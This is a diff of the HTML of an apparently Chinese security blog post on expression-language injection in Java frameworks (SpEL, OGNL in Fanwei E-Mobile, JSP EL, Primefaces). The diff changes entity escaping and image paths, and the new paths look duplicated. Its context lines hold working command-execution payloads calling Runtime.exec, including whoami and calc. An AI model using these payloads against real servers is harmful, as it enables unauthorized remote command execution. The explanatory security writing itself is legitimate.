@@ -149,7 +149,7 @@ AC.getValueStack().findValue(expression));<span aria-hidden="true" class="line-n
 <p>s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017</p>
 <h2 id="Spring——SPEL"><a href="#Spring——SPEL" class="headerlink" title="Spring——SPEL"></a>Spring——SPEL</h2><p>SPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。</p>
 <p>基本用法：</p>
-<p>在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。</p>
+<p>在jsp页面中可以使用el表达式代替&lt;%&#x3D;%&gt;，之间访问java对象。</p>
 <pre class="line-numbers language-none"><code class="language-none">java
 
 String expression &#x3D; &quot;T(java.lang.Runtime).getRuntime().exec(&#x2F;&quot;calc&#x2F;&quot;)&quot;;
@@ -180,12 +180,12 @@ public class MVELTest &#123;
   &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="执行代码："><a href="#执行代码：" class="headerlink" title="执行代码："></a>执行代码：</h3><h2 id="OGNL表达式注入："><a href="#OGNL表达式注入：" class="headerlink" title="OGNL表达式注入："></a>OGNL表达式注入：</h2><p>示例：泛微E-Mobile</p>
 <p>表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。</p>
-<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/1.png" alt="img"></p>
+<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/1.png" alt="img"></p>
 <p>先用一个小的加减乘除做验证：</p>
-<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/2.png" alt="img"></p>
+<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/2.png" alt="img"></p>
 <p>执行exp语句，执行命令whoami，</p>
 <pre class="line-numbers language-none"><code class="language-none">@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/3.png" alt="img"></p>
+<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/3.png" alt="img"></p>
 <p>尝试报路径，但此例并不成功</p>
 <pre class="line-numbers language-none"><code class="language-none">%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="EL表达式注入："><a href="#EL表达式注入：" class="headerlink" title="EL表达式注入："></a>EL表达式注入：</h2><p>​    实例：CVE-2011-2730</p>
@@ -207,11 +207,11 @@ public class MVELTest &#123;
 <p>11   initParam          表示一个保存了所有web应用初始化参数的map对象</p>
 <p>语法：${运算表达式}，EL表达式支持如下运算符：</p>
 <p>　1、关系运算符</p>
-<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/4.png" alt="img"></p>
+<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/4.png" alt="img"></p>
 <p>　2、逻辑运算符：</p>
-<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/5.png" alt="img"></p>
+<p><img src="/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/5.png" alt="img"></p>
 <p>　3、empty运算符：检查对象是否为null(空)</p>
-<p>　4、二元表达式：${user!=null?user.name :””}<br> 　5、[ ] 和 . 号运算符</p>
+<p>　4、二元表达式：${user!&#x3D;null?user.name :””}<br> 　5、[ ] 和 . 号运算符</p>
 <p>执行exp语句：</p>
 <pre class="line-numbers language-none"><code class="language-none">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="Primefaces框架表达式注入"><a href="#Primefaces框架表达式注入" class="headerlink" title="Primefaces框架表达式注入:"></a>Primefaces框架表达式注入:</h2><p>Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密!</p>
